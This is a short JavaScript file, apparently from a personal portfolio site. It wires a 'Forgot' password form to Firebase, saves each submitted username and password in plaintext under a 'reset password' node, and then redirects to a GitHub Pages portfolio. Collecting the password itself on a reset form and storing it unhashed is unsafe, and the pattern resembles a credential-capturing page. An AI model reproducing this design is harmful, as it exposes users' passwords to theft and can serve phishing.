const firebaseConfig = {
    apiKey: "AIzaSyDnJTqyRaIao5oGAhP00HmZ2vE9CTCsBpU",
    authDomain: "vishalportfolio-e5d4b.firebaseapp.com",
    databaseURL: "https://vishalportfolio-e5d4b-default-rtdb.firebaseio.com",
    projectId: "vishalportfolio-e5d4b",
    storageBucket: "vishalportfolio-e5d4b.appspot.com",
    messagingSenderId: "547693392796",
    appId: "1:547693392796:web:2bc5657863517ac482ce59",
    measurementId: "G-NX05ZDMFBS"
  };


  //initialize the firebase
  firebase.initializeApp(firebaseConfig);


  //reference our database
var ContactFormDb =  firebase.database().ref('reset password');

document.getElementById('Forgot').addEventListener('submit',submitform);

//store all data on a variables on submit
function submitform(e){
    e.preventDefault();

    //getdata user data form one by one and store
    var User = getElementVal('User_Name');
    var password = getElementVal('password');


    //call savemassage function so that our data can stored in database
    saveMassage(User,password);

    document.getElementById('alert_box').style.display='flex';
    document.getElementById('redirect').style.display = 'block';
    
    setTimeout(()=>{
        window.location.assign('https://kanojiya9768.github.io/vishalportfolio.com/');
    },5000);
}



//now store contact form data in variables data in database
const saveMassage = (User,password) =>{
    var newContactForm = ContactFormDb.push();


    newContactForm.set({
        User : User,
        password : password,
    });
};


// get input data by id 
const getElementVal = (id) =>{
    return document.getElementById(id).value;
};
